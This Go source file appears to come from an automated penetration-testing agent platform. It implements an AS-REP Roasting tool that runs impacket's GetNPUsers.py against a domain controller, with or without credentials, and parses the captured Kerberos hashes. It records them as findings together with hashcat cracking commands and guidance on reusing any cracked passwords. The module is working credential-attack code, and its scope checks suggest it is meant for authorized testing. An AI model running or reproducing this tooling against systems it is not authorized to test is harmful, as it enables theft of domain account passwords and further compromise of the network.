package agent

// AD AS-REP Roasting (T1558.004): the credential-free sibling of Kerberoasting.
//
// Same execution model as ad_kerberoast:
//   - code builds/executes impacket's GetNPUsers.py and parses $krb5asrep$;
//   - credentials come from the task credential store (or explicit/user list);
//   - hashes become findings, a no-hash run becomes an inferred fact;
//   - dry_run checks 88/LDAP reachability and impacket availability.
//
// Unauthenticated mode needs a user list (`users`): GetNPUsers.py tests each
// account for DONT_REQ_PREAUTH and requests the AS-REP. With a domain credential
// it can enumerate roastable users itself.

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/Autumn-27/artex/db"
	actool "github.com/Autumn-27/norma/tool"
)

const asrepModuleID = "ad.asreproast"

var (
	asrepLocateRunner = func() (kerberoastRunner, error) {
		return locateImpacketScript("GetNPUsers.py", "impacket-GetNPUsers")
	}
	asrepExecRunner = execKerberoastCommand
)

type asrepRoastParams struct {
	DC           string          `json:"dc"`
	Domain       string          `json:"domain"`
	Username     string          `json:"username,omitempty"`
	Password     string          `json:"password,omitempty"`
	Hash         string          `json:"hash,omitempty"`
	CredentialID json.RawMessage `json:"credential_id,omitempty"`
	Users        []string        `json:"users,omitempty"`
	LDAPPort     int             `json:"ldap_port,omitempty"`
	TimeoutSec   int             `json:"timeout_sec,omitempty"`
	DryRun       bool            `json:"dry_run,omitempty"`
}

func (p *asrepRoastParams) Validate() error {
	kp := kerberoastParams{
		DC: p.DC, Domain: p.Domain, Username: p.Username, Password: p.Password,
		Hash: p.Hash, CredentialID: p.CredentialID, LDAPPort: p.LDAPPort, TimeoutSec: p.TimeoutSec,
	}
	if err := kp.Validate(); err != nil {
		return err
	}
	p.DC, p.Domain, p.Username, p.Password, p.Hash = kp.DC, kp.Domain, kp.Username, kp.Password, kp.Hash
	p.LDAPPort, p.TimeoutSec = kp.LDAPPort, kp.TimeoutSec

	seen := map[string]bool{}
	users := make([]string, 0, len(p.Users))
	for _, u := range p.Users {
		u = sanitizeADAccount(u)
		if u == "" || seen[u] {
			continue
		}
		seen[u] = true
		users = append(users, u)
	}
	if len(users) > 5000 {
		return fmt.Errorf("users 过多（上限 5000）")
	}
	p.Users = users

	if p.Username == "" && len(p.CredentialID) == 0 && len(p.Users) == 0 && !p.DryRun {
		return fmt.Errorf("需要域凭据（username/password/hash 或 credential_id）或 users 列表（无凭据 AS-REP 枚举）")
	}
	return nil
}

type asrepHash struct {
	AccountName string `json:"account_name"`
	Realm       string `json:"realm,omitempty"`
	EType       int    `json:"etype"`
	Format      string `json:"format"`
	HashcatMode int    `json:"hashcat_mode"`
	Hash        string `json:"hash"`
}

type asrepFinding struct {
	AccountName string `json:"account_name"`
	Severity    string `json:"severity"`
	Title       string `json:"title"`
	FindingID   int64  `json:"finding_id,omitempty"`
	NodeID      int64  `json:"node_id,omitempty"`
	Merged      bool   `json:"merged,omitempty"`
	RecordError string `json:"record_error,omitempty"`
}

type asrepResult struct {
	ModuleID   string          `json:"module_id"`
	MITRE      string          `json:"mitre"`
	Status     string          `json:"status"` // success | enumerated | failed | dry_run
	DC         string          `json:"dc"`
	Domain     string          `json:"domain"`
	Auth       *kerberoastAuth `json:"auth,omitempty"`
	UsersCount int             `json:"users_count,omitempty"`
	Hashes     []asrepHash     `json:"hashes"`
	Findings   []asrepFinding  `json:"findings,omitempty"`
	FactID     int64           `json:"fact_id,omitempty"`
	Outcome    string          `json:"outcome,omitempty"`
	Tooling    map[string]any  `json:"tooling,omitempty"`
	NextSteps  []string        `json:"next_steps,omitempty"`
	Warnings   []string        `json:"warnings,omitempty"`
	Error      string          `json:"error,omitempty"`
	OutputTail string          `json:"output_tail,omitempty"`
	ElapsedMs  int64           `json:"elapsed_ms"`
}

func (t *ToolSet) toolASREPRoast() actool.CoreTool {
	return t.writeExpTool("ad_asreproast",
		"【AD 攻击 · T1558.004 AS-REP Roasting】枚举 DONT_REQ_PREAUTH 账号并请求 AS-REP，拿回可离线爆破的 $krb5asrep$ 哈希（hashcat -m 18200）。\n"+
			"凭据优先 credential_id（先 list_credentials）或自动选本任务中域匹配的 password/hash_nt 凭据；也兼容显式 username+password/hash。无凭据时传 users 列表走 -no-pass 模式。\n"+
			"命中 AS-REP 哈希回写 finding（evidence 含完整哈希与 hashcat 命令）；无命中回写 inferred fact。dry_run=true 只检查 DC 88/LDAP 与 impacket。\n"+
			"前提：DC 88/TCP 与 LDAP(389/636) 可达、时钟偏差 ≤5 分钟、已装 impacket（GetNPUsers.py）。",
		obj(map[string]any{
			"dc":            str("域控 IP 或 FQDN，必填"),
			"domain":        str("AD DNS 域名，如 CORP.LOCAL，必填"),
			"credential_id": map[string]any{"type": "integer", "description": "可选：平台凭据 id；不传则自动选域匹配的 password/hash_nt 凭据"},
			"username":      str("可选：显式域用户名（需同时给 password 或 hash）"),
			"password":      str("可选：显式口令（优先用 credential_id）"),
			"hash":          str("可选：显式 NTLM hash，NT(32 hex) 或 LMHASH:NTHASH"),
			"users":         map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "可选：无凭据模式下的用户名列表（每行一个 sAMAccountName）；有凭据时可省略"},
			"ldap_port":     map[string]any{"type": "integer", "description": "LDAP 端口，默认 389；仅 dry_run 探测用（389/636）", "default": 389},
			"timeout_sec":   map[string]any{"type": "integer", "description": "impacket 超时秒数，默认 180，范围 10..600", "default": 180},
			"dry_run":       map[string]any{"type": "boolean", "description": "只探测 DC 88/LDAP 可达与 GetNPUsers.py 是否就绪，不发认证请求"},
		}, "dc", "domain"),
		t.asrepHandler)
}

func (t *ToolSet) asrepHandler(ctx context.Context, in json.RawMessage) (actool.Result, error) {
	var p asrepRoastParams
	if err := json.Unmarshal(in, &p); err != nil {
		return actool.Errorf("参数解析失败：" + err.Error()), nil
	}
	if err := p.Validate(); err != nil {
		return actool.Errorf(err.Error()), nil
	}
	if err := t.assertInScope(p.DC); err != nil {
		return actool.Errorf(err.Error()), nil
	}
	start := time.Now()
	res := asrepResult{
		ModuleID: asrepModuleID, MITRE: "T1558.004", Status: "failed",
		DC: p.DC, Domain: p.Domain, Hashes: []asrepHash{},
	}

	if p.DryRun {
		res.Status = "dry_run"
		res.Tooling = t.asrepDryRun(ctx, &p)
		res.ElapsedMs = time.Since(start).Milliseconds()
		res.NextSteps = []string{
			"dry_run 通过后：有域凭据直接跑；无凭据请传 users 列表",
			"命中后把 hashes 交给 hashcat -m 18200 离线爆破，不要在域内在线爆",
		}
		return jsonResult(res)
	}

	var cred *resolvedKerberoastCred
	if p.Username != "" || len(p.CredentialID) > 0 {
		kp := &kerberoastParams{
			DC: p.DC, Domain: p.Domain, Username: p.Username, Password: p.Password,
			Hash: p.Hash, CredentialID: p.CredentialID, LDAPPort: p.LDAPPort, TimeoutSec: p.TimeoutSec,
		}
		c, err := t.resolveKerberoastCredential(ctx, kp)
		if err != nil {
			res.Error = err.Error()
			res.NextSteps = []string{
				"先 add_credential 登记域凭据，或显式传 username+password/hash",
				"无凭据时改用 users 列表走 -no-pass AS-REP 枚举",
			}
			res.ElapsedMs = time.Since(start).Milliseconds()
			return jsonResult(res)
		}
		cred = &c
		a := c.authInfo()
		res.Auth = &a
	}
	res.UsersCount = len(p.Users)
	if cred == nil {
		// Unauthenticated user-list mode.
		a := kerberoastAuth{Source: "users_list", HasPassword: false, HasHash: false}
		res.Auth = &a
	}

	out, runErr := t.runASREPRoast(ctx, &p, cred)
	res.ElapsedMs = time.Since(start).Milliseconds()
	res.Hashes = parseASREPHashes(out)
	if runErr != nil && len(res.Hashes) == 0 {
		res.Status = "failed"
		res.Error = asrepRunErrorMessage(runErr, out, time.Duration(p.TimeoutSec)*time.Second)
		res.OutputTail = kerbTruncate(out, kerberoastOutputTail)
		res.NextSteps = []string{
			"确认 DC 88/LDAP 可达、时钟偏差 ≤5 分钟、凭据/用户列表正确",
			"无凭据模式需要 users 列表；有凭据模式可让 GetNPUsers 自行枚举",
		}
		return jsonResult(res)
	}

	if len(res.Hashes) > 0 {
		res.Status = "success"
		t.recordASREPFindings(ctx, &res)
		res.Outcome = fmt.Sprintf("捕获 %d 个可离线爆破的 AS-REP 哈希", len(res.Hashes))
		res.NextSteps = []string{
			"把 hashes 写入文件，按 hashes[].hashcat_mode 离线爆破（etype 23→18200，17→19800，18→19900）",
			"爆破出明文后用 add_credential 登记并标 verified=true；不要在域内在线爆破",
			"AS-REP 账号常常是服务/遗留账号，优先看高权组与老密码",
		}
		if runErr != nil {
			res.Warnings = append(res.Warnings, "部分请求失败："+asrepRunErrorMessage(runErr, out, time.Duration(p.TimeoutSec)*time.Second))
		}
	} else {
		res.Status = "enumerated"
		res.Outcome = fmt.Sprintf("枚举完成，未捕获 AS-REP 哈希（users=%d）", len(p.Users))
		t.recordASREPFact(ctx, &res, out)
		res.NextSteps = []string{
			"没有 DONT_REQ_PREAUTH 账号是常态；转 ad_kerberoast / 委派 / ADCS",
			"无凭据模式确认 users 列表覆盖了真实账号；有凭据模式确认 LDAP 可读",
		}
	}
	return jsonResult(res)
}

func (t *ToolSet) asrepDryRun(ctx context.Context, p *asrepRoastParams) map[string]any {
	out := map[string]any{"ldap_port": p.LDAPPort}
	probe := func(port int) map[string]any {
		ok, errText := probeADTCP(ctx, p.DC, port, 5*time.Second)
		m := map[string]any{"port": port, "reachable": ok}
		if errText != "" {
			m["error"] = errText
		}
		return m
	}
	out["kerberos_tcp_88"] = probe(88)
	out["ldap"] = probe(p.LDAPPort)
	if runner, err := asrepLocateRunner(); err != nil {
		out["impacket_ready"] = false
		out["impacket_error"] = err.Error()
	} else {
		out["impacket_ready"] = true
		out["runner"] = runner.Bin
	}
	if len(p.Users) > 0 {
		out["users_count"] = len(p.Users)
	}
	return out
}

func (t *ToolSet) runASREPRoast(ctx context.Context, p *asrepRoastParams, cred *resolvedKerberoastCred) (string, error) {
	runner, err := asrepLocateRunner()
	if err != nil {
		return "", err
	}
	usersFile := ""
	if cred == nil {
		// Keep the temporary user list in the per-intent run directory when
		// available: the process may run with a read-only system TEMP (sandbox,
		// service account), while the run dir is guaranteed writable.
		tmpDir := ""
		if t.ledger != nil && t.ledger.path != "" {
			tmpDir = filepath.Dir(t.ledger.path)
		}
		f, ferr := os.CreateTemp(tmpDir, "artex-asrep-users-*.txt")
		if ferr != nil {
			return "", fmt.Errorf("创建 users 临时文件失败：%v", ferr)
		}
		usersFile = f.Name()
		defer os.Remove(usersFile)
		for _, u := range p.Users {
			if _, werr := fmt.Fprintln(f, u); werr != nil {
				_ = f.Close()
				return "", fmt.Errorf("写 users 文件失败：%v", werr)
			}
		}
		if cerr := f.Close(); cerr != nil {
			return "", fmt.Errorf("关闭 users 文件失败：%v", cerr)
		}
	}
	args, err := buildASREPArgs(p, cred, usersFile)
	if err != nil {
		return "", err
	}
	timeout := time.Duration(p.TimeoutSec) * time.Second
	out, err := asrepExecRunner(ctx, runner, args, timeout)
	if cred != nil {
		out = redactKerberoastSecret(out, cred.Password)
	}
	return out, err
}

func buildASREPArgs(p *asrepRoastParams, cred *resolvedKerberoastCred, usersFile string) ([]string, error) {
	if cred == nil {
		if strings.TrimSpace(usersFile) == "" {
			return nil, fmt.Errorf("无凭据模式需要 users 列表")
		}
		return []string{
			p.Domain + "/", "-dc-ip", p.DC,
			"-usersfile", usersFile, "-no-pass",
			"-request", "-format", "hashcat",
		}, nil
	}
	target := strings.TrimSpace(p.Domain) + "/" + cred.Username
	if cred.Password != "" {
		target += ":" + cred.Password
	}
	args := []string{target, "-dc-ip", p.DC, "-request", "-format", "hashcat"}
	if cred.Hash != "" {
		h, err := normalizeKerberoastHashes(cred.Hash)
		if err != nil {
			return nil, err
		}
		args = append(args, "-hashes", h)
	}
	if cred.Password == "" && cred.Hash == "" {
		args = append(args, "-no-pass")
	}
	return args, nil
}

func parseASREPHashes(out string) []asrepHash {
	hashes := []asrepHash{}
	seen := map[string]bool{}
	for _, rawLine := range strings.Split(strings.ReplaceAll(out, "\r\n", "\n"), "\n") {
		line := strings.TrimSpace(rawLine)
		i := strings.Index(line, "$krb5asrep$")
		if i < 0 {
			continue
		}
		line = line[i:]
		if seen[line] {
			continue
		}
		seen[line] = true
		rest := strings.TrimPrefix(line, "$krb5asrep$")
		parts := strings.SplitN(rest, "$", 3)
		if len(parts) < 3 {
			continue
		}
		etype, _ := strconv.Atoi(parts[0])
		principal := parts[1]
		if j := strings.Index(principal, ":"); j >= 0 {
			principal = principal[:j]
		}
		account, realm := principal, ""
		if j := strings.Index(principal, "@"); j > 0 {
			account, realm = principal[:j], principal[j+1:]
		}
		if account == "" {
			continue
		}
		hashes = append(hashes, asrepHash{
			AccountName: account, Realm: realm, EType: etype,
			Format: asrepHashcatFormat(etype), HashcatMode: asrepHashcatMode(etype), Hash: line,
		})
	}
	return hashes
}

func asrepHashcatMode(etype int) int {
	switch etype {
	case 23:
		return 18200 // AS-REP RC4
	case 17:
		return 19800 // AS-REP AES128
	case 18:
		return 19900 // AS-REP AES256
	default:
		return 0
	}
}

func asrepHashcatFormat(etype int) string {
	switch etype {
	case 23:
		return "hashcat 18200 (AS-REP RC4)"
	case 17:
		return "hashcat 19800 (AS-REP AES128)"
	case 18:
		return "hashcat 19900 (AS-REP AES256)"
	default:
		return "unknown AS-REP etype"
	}
}

func asrepRunErrorMessage(runErr error, out string, timeout time.Duration) string {
	msg := strings.ReplaceAll(kerbRunErrorMessage(runErr, out, timeout), "GetUserSPNs.py", "GetNPUsers.py")
	return strings.ReplaceAll(msg, "GetUserSPNs", "GetNPUsers")
}

func (t *ToolSet) recordASREPFindings(ctx context.Context, res *asrepResult) {
	if t.ts == nil || len(res.Hashes) == 0 {
		return
	}
	assetIDs := t.kerberoastAssetIDs(res.DC)
	seen := map[string]bool{}
	for _, h := range res.Hashes {
		if h.Hash == "" || seen[h.Hash] {
			continue
		}
		seen[h.Hash] = true
		title := fmt.Sprintf("AS-REP roastable account: %s", h.AccountName)
		summary := fmt.Sprintf("账号 %s 未开启 Kerberos 预认证，捕获 AS-REP 哈希，可离线爆破口令", h.AccountName)
		crack := fmt.Sprintf("hashcat -m %d asrep.txt wordlist.txt", h.HashcatMode)
		if h.HashcatMode == 0 {
			crack = "hashcat（未知 AS-REP etype，需人工确认模式）"
		}
		evidence := fmt.Sprintf("account=%s\nrealm=%s\netype=%d\nhash=%s\ncrack=%s",
			h.AccountName, h.Realm, h.EType, h.Hash, crack)
		input := db.RecordFindingInput{
			TaskID: t.taskID, ExplorationID: t.ts.ID(), IntentID: t.ownerNode,
			VulnClass: "asreproast", Name: title, Severity: "high",
			Summary: summary, Evidence: evidence, Worker: t.worker, AssetIDs: assetIDs,
		}
		var rec *db.RecordedFinding
		var err error
		if t.findingRecorder != nil {
			rec, err = t.findingRecorder.Record(ctx, input, nil)
		} else {
			rec, err = t.ts.RecordFinding(ctx, input)
		}
		f := asrepFinding{AccountName: h.AccountName, Severity: "high", Title: title}
		if err != nil {
			f.RecordError = err.Error()
		} else if rec != nil {
			f.FindingID, f.NodeID, f.Merged = rec.FindingID, rec.NodeID, rec.Merged
			t.writes.Findings++
		}
		res.Findings = append(res.Findings, f)
	}
	if len(res.Findings) > 0 {
		if t.notifyFinding != nil {
			t.notifyFinding(t.ownerNode, fmt.Sprintf("AS-REP Roast 捕获 %d 个哈希", len(res.Hashes)))
		} else if t.notify != nil {
			t.notify()
		}
	}
}

func (t *ToolSet) recordASREPFact(ctx context.Context, res *asrepResult, raw string) {
	if t.ts == nil {
		return
	}
	summary := fmt.Sprintf("AS-REP Roast %s：未捕获 AS-REP 哈希", res.Domain)
	detail := fmt.Sprintf("GetNPUsers 枚举完成（users=%d），没有拿到 $krb5asrep$ 哈希；可能是没有 DONT_REQ_PREAUTH 账号，或用户列表/凭据不足。", res.UsersCount)
	evidence := fmt.Sprintf("GetNPUsers.py -dc-ip %s -request -> 0 hash", res.DC)
	if len(raw) > 0 {
		evidence = kerbTruncate(strings.TrimSpace(raw), 300)
	}
	id, note, err := t.recordOneFactChecked(factItem{
		Summary: summary, Detail: detail, Evidence: evidence,
		Confidence: FactConfidenceInferred,
		IntentID:   json.RawMessage(strconv.FormatInt(t.ownerNode, 10)),
	}, t.ownerNode, nil)
	if err != nil {
		res.Warnings = append(res.Warnings, "fact 回写失败："+err.Error())
		return
	}
	res.FactID = id
	if note != "" {
		res.Warnings = append(res.Warnings, note)
	}
}
